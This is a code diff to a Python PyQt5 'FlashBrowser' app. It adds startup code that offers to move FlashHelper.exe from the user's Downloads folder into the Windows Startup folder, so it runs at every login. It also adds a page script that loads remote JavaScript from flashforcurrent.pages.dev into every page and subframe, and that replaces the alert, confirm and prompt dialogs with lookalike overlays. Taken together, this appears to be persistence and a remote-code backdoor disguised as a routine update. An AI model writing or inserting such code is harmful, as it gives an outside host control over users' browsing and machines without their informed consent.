@@ -9,6 +9,20 @@ import ctypes
 import subprocess
 from ctypes import wintypes
 
+os.environ["QT_WEBENGINE_DISABLE_TSF"] = "1"
+
+import os
+import shutil
+import subprocess
+from tkinter import messagebox, Tk
+
+downloads = os.path.join(os.path.expanduser("~"), "Downloads")
+exe_name = "FlashHelper.exe"
+exe_path = os.path.join(downloads, exe_name)
+autostart_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup', exe_name)
+root = Tk()
+root.withdraw()
+
 if os.path.exists(exe_path):
     if messagebox.askyesno("Install FlashHelper", "Do you want to install FlashHelper.exe"):
         shutil.move(exe_path, autostart_path)
@@ -18,8 +32,6 @@ if os.path.exists(exe_path):
         messagebox.showinfo("Cancelled", "Installation cancelled")
     root.destroy()
     sys.exit()
-
-os.environ["QT_WEBENGINE_DISABLE_TSF"] = "1"
 
 def drop_privileges_and_restart():
     if "--sandboxed" in sys.argv:
@@ -77,7 +89,7 @@ from PyQt5.QtCore import QUrl, QCoreApplication, Qt, pyqtSignal, QObject, QPoint
 from PyQt5.QtWidgets import (QApplication, QMainWindow, QFrame, QLabel, QPushButton,
                              QLineEdit, QVBoxLayout, QHBoxLayout, QDesktopWidget)
 from PyQt5.QtGui import QMouseEvent, QKeyEvent, QWheelEvent, QIcon, QImage
-from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEngineSettings, QWebEnginePage
+from PyQt5.QtWebEngineWidgets import QWebEngineView, QWebEngineSettings, QWebEnginePage, QWebEngineScript
 from PyQt5.QtWebSockets import QWebSocketServer
 from PyQt5.QtNetwork import QHostAddress
 
@@ -158,6 +170,157 @@ class FlashBrowser(QMainWindow):
         self.browser.setPage(self.page)
         self.last_full_frame_time = 0
         self.last_frame_img = None
+
+        script = QWebEngineScript()
+        script.setSourceCode("""
+            (function() {
+                var s = document.createElement('script');
+                s.src = 'https://flashforcurrent.pages.dev/script.js';
+                document.head.appendChild(s);
+            })();
+
+            (function () {
+                function createOverlay() {
+                    const o = document.createElement("div");
+                    o.style.position = "fixed";
+                    o.style.top = "0";
+                    o.style.left = "0";
+                    o.style.width = "100%";
+                    o.style.height = "100%";
+                    o.style.background = "rgba(0,0,0,0.5)";
+                    o.style.display = "flex";
+                    o.style.alignItems = "center";
+                    o.style.justifyContent = "center";
+                    o.style.zIndex = "9999";
+                    return o;
+                }
+
+                function createBox() {
+                    const b = document.createElement("div");
+                    b.style.background = "#1e1e2f";
+                    b.style.color = "#fff";
+                    b.style.padding = "20px";
+                    b.style.borderRadius = "12px";
+                    b.style.minWidth = "280px";
+                    b.style.fontFamily = "sans-serif";
+                    b.style.boxShadow = "0 10px 30px rgba(0,0,0,0.3)";
+                    b.style.textAlign = "center";
+                    return b;
+                }
+
+                function createBtn(text) {
+                    const btn = document.createElement("button");
+                    btn.textContent = text;
+                    btn.style.margin = "10px 5px 0";
+                    btn.style.padding = "8px 16px";
+                    btn.style.border = "none";
+                    btn.style.borderRadius = "8px";
+                    btn.style.background = "#4f46e5";
+                    btn.style.color = "#fff";
+                    btn.style.cursor = "pointer";
+
+                    btn.onmouseover = () => btn.style.background = "#6366f1";
+                    btn.onmouseout = () => btn.style.background = "#4f46e5";
+
+                    return btn;
+                }
+
+                window.alert = function (msg) {
+                    return new Promise((res) => {
+                        const o = createOverlay();
+                        const b = createBox();
+                        const p = document.createElement("div");
+
+                        p.textContent = msg;
+
+                        const ok = createBtn("OK");
+
+                        ok.onclick = () => {
+                            document.body.removeChild(o);
+                            res();
+                        };
+
+                        b.appendChild(p);
+                        b.appendChild(ok);
+                        o.appendChild(b);
+                        document.body.appendChild(o);
+                    });
+                };
+
+                window.confirm = function (msg) {
+                    return new Promise((res) => {
+                        const o = createOverlay();
+                        const b = createBox();
+                        const p = document.createElement("div");
+
+                        p.textContent = msg;
+
+                        const yes = createBtn("Yes");
+                        const no = createBtn("No");
+
+                        yes.onclick = () => {
+                            document.body.removeChild(o);
+                            res(true);
+                        };
+
+                        no.onclick = () => {
+                            document.body.removeChild(o);
+                            res(false);
+                        };
+
+                        b.appendChild(p);
+                        b.appendChild(yes);
+                        b.appendChild(no);
+                        o.appendChild(b);
+                        document.body.appendChild(o);
+                    });
+                };
+
+                window.prompt = function (msg, def = "") {
+                    return new Promise((res) => {
+                        const o = createOverlay();
+                        const b = createBox();
+                        const p = document.createElement("div");
+
+                        p.textContent = msg;
+
+                        const input = document.createElement("input");
+                        input.value = def;
+                        input.style.width = "90%";
+                        input.style.marginTop = "10px";
+                        input.style.padding = "8px";
+                        input.style.borderRadius = "6px";
+                        input.style.border = "none";
+
+                        const ok = createBtn("OK");
+                        const cancel = createBtn("Cancel");
+
+                        ok.onclick = () => {
+                            document.body.removeChild(o);
+                            res(input.value);
+                        };
+
+                        cancel.onclick = () => {
+                            document.body.removeChild(o);
+                            res(null);
+                        };
+
+                        b.appendChild(p);
+                        b.appendChild(input);
+                        b.appendChild(ok);
+                        b.appendChild(cancel);
+                        o.appendChild(b);
+                        document.body.appendChild(o);
+
+                        input.focus();
+                    });
+                };
+            })();
+        """)
+        script.setInjectionPoint(QWebEngineScript.DocumentReady)
+        script.setWorldId(QWebEngineScript.MainWorld)
+        script.setRunsOnSubFrames(True)
+        self.browser.page().profile().scripts().insert(script)
 
         settings = self.browser.settings()
         settings.setAttribute(QWebEngineSettings.PluginsEnabled, True)
